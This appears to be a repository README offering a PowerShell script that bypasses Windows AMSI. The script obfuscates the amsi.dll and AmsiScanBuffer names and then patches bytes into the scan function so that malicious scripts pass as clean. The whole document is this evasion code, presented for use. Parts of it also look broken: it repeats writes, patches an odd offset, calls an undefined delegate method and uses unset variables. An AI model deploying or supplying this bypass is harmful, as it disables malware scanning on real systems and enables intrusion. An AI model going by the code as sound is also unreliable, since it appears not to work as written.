# AMSI-Bypass, Variations of existing AMSI Bypass tricks

# amsi bypass

```
$abldry = @"
using System;
using System.Runtime.InteropServices;
public class abldry {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
}
"@

Add-Type $abldry

$qmsflr = [abldry]::LoadLibrary("$(('ämsì.d'+'ll').NoRMalizE([CHaR](70)+[CHAR](111+66-66)+[CHAr](114)+[Char]([BYte]0x6d)+[cHAr]([bYTe]0x44)) -replace [CHar]([byTe]0x5c)+[cHAR]([bYte]0x70)+[cHar](123+1-1)+[chaR]([ByTe]0x4d)+[cHar]([Byte]0x6e)+[cHaR]([BYte]0x7d))")
$zmpquc = [abldry]::GetProcAddress($qmsflr, "$(('ÃmsîScän'+'Buffer').NORMALIzE([CHAR](70+15-15)+[cHar](111+78-78)+[Char](114+79-79)+[cHaR]([byTE]0x6d)+[ChaR](68+16-16)) -replace [ChaR]([ByTE]0x5c)+[chaR](112)+[chAR](123+26-26)+[ChAr]([BYTe]0x4d)+[char](110*62/62)+[CHAr](125))")
[Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($zmpquc.ToInt64() + 0x100), 0x31)
[Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($zmpquc.ToInt64() + 0x101), 0xc0)
[Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($zmpquc.ToInt64() + 0x102), 0x64)
[Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($zmpquc.ToInt64() + 0x103), 0x8b)
[Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($zmpquc.ToInt64() + 0x104), 0x80)
[Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]($zmpquc.ToInt64() + 0x105), 0x24010000)
[Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($zmpquc.ToInt64() + 0x109), 0x8b)
[Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($zmpquc.ToInt64() + 0x10a), 0x40)
[Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($zmpquc.ToInt64() + 0x10b), 0x0c)
[Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($zmpquc.ToInt64() + 0x10c), 0x8b)
[Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($zmpquc.ToInt64() + 0x10d), 0x70)
[Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($zmpquc.ToInt64() + 0x10e), 0x1c)
# Patch the AMSI scan buffer so that the engine always returns a clean result
[Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($zmpquc.ToInt64() + 0x10d), 0x70)
[Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($zmpquc.ToInt64() + 0x10e), 0x1c)

# Call the patched AMSI scan function
$ltgszy = [System.Text.Encoding]::UTF8.GetBytes($nrrsjd)
$jsqzmi = [Runtime.InteropServices.Marshal]::AllocHGlobal($ltgszy.Length)
[Runtime.InteropServices.Marshal]::Copy($ltgszy, 0, $jsqzmi, $ltgszy.Length)
try {
    $qvmnfo = [abldry]::GetProcAddress($qmsflr, "AmsiScanBuffer")
    $xynntn = [abldry]::CreateDelegate("System.Func`4[System.IntPtr,System.IntPtr,System.UInt32,System.UInt32]", $null, $qvmnfo)
    $xynntn.Invoke($jsqzmi, [UInt32]$ltgszy.Length, $ltgszy.Length, [ref]$fhgltp) | Out-Null
} finally {
    [Runtime.InteropServices.Marshal]::FreeHGlobal($jsqzmi) | Out-Null
}
```
